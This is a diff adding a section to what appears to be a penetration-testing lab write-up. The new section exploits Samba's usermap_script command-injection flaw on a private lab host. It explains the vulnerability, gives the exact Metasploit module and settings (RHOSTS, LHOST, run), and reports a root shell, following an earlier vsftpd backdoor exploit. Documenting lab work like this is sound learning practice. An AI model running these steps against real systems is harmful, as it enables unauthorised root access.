@@ -131,3 +131,39 @@ Meterpreter session opened. `getuid` confirmed root access (uid=0, gid=0).
 ### Screenshot
 ![vsftpd backdoor exploit](screenshots/vsftpd-exploit.png)
 
+
+## Second exploit: Samba usermap_script
+
+**Target:** 192.168.56.30, port 139/445 (Samba)
+**Tool:** Metasploit Framework (msfconsole)
+**Module:** exploit/multi/samba/usermap_script
+
+### What the vulnerability is
+Older versions of Samba's "username map script" feature allow shell
+metacharacters in a submitted username to be passed through to the system
+shell, resulting in arbitrary command execution. Unlike the vsftpd backdoor
+(a deliberately planted trigger), this is a real code-injection
+vulnerability in how Samba handled that configuration option.
+
+### Steps
+1. Identified Samba on ports 139/445 via `nmap -sV` earlier.
+2. In msfconsole: `search type:exploit samba` →
+   `exploit/multi/samba/usermap_script`
+3. `use exploit/multi/samba/usermap_script`
+4. `set RHOSTS 192.168.56.30`
+5. `set LHOST 192.168.56.10`
+6. `run`
+
+### Result
+A command shell session opened. Unlike Meterpreter, this shell shows no
+visible prompt, confirmed it was live by typing `whoami` blind, which
+returned `root`.
+
+### Lesson learned
+A successful session with no visible prompt isn't a frozen terminal, it's
+normal for `exploit/multi/samba/usermap_script` and similar raw command-shell
+payloads. Typing a command (e.g. `whoami`) and pressing Enter confirms
+whether the shell is actually live.
+
+### Screenshot
+![Samba usermap_script exploit](screenshots/samba-exploit.png)
